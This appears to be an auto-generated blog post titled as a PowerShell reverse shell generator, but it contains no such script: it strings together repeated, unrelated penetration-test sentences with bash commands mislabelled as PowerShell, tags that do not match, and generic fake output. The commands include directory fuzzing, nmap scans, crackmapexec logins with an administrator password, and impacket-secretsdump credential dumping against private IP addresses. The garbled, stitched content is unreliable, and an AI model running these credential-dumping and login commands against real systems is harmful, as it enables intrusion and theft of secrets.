---
TitleSEO: "Reverse Shell Generator in PowerShell | ZureFX"
TitlePost: "Reverse Shell Generator — PowerShell"
Author: "ZureFX"
Description: "A PowerShell script for reverse shell generator. Built for security research and automation."
Keywords: "scanner, python, tool, c, parser, powershell"
URL: "https://zurefx.github.io/scripting/script-reverse-shell-generator-250.html"
URL_IMAGES: ""
Date: "2026-01-30"
Tags: "Scanner, Python, Tool, C, Parser, PowerShell"
Section: "scripting"
Lang: "en"
main_img: "script-reverse-shell-generator-250"
Permalink: "/scripting/script-reverse-shell-generator-250.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The target system was identified as running a vulnerable version of the service. Unconstrained delegation was enabled on the compromised machine. Privilege escalation was possible due to misconfigured sudo permissions.

Built with **PowerShell** for offensive security automation.

### Requirements

- PowerShell
- `feroxbuster`
- `lookupsid`
- `evil-winrm`

## Implementation

### Core Logic

Group Policy Preferences contained encrypted but recoverable credentials. The target system was identified as running a vulnerable version of the service.

```powershell
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.27.130.86/FUZZ
```

The kernel version was outdated and vulnerable to a publicly known exploit. The web application was vulnerable to Server-Side Template Injection (SSTI).

### Helper Functions

The target system was identified as running a vulnerable version of the service. Group Policy Preferences contained encrypted but recoverable credentials.

```powershell
feroxbuster -h
crackmapexec smb 10.60.138.197 -u administrator -p 'P@ssw0rd!' --shares
nmap -sCV -p1521,1433,27017 10.61.31.72 -oN scan.txt
feroxbuster -h
```

## Usage

### Basic Usage

Lateral movement was facilitated by reusing discovered credentials across services. Post-exploitation enumeration revealed a path to domain administrator privileges.

```bash
crackmapexec smb 10.93.50.101 -u administrator -p 'P@ssw0rd!' --shares
impacket-secretsdump administrator:'P@ssw0rd!'@10.123.164.115
```

### Advanced Options

Token impersonation allowed elevation to SYSTEM privileges on the target. The backup files contained sensitive information that should not have been accessible. Unconstrained delegation was enabled on the compromised machine.

```bash
crackmapexec smb 10.125.206.218 -u administrator -p 'P@ssw0rd!' --shares
```

## Output

### Example Output

Lateral movement was facilitated by reusing discovered credentials across services. The scheduled task ran with elevated privileges and could be abused for escalation.

```
[+] Scanning target...
[+] Found 9 results
[+] Done in 8.22s
```
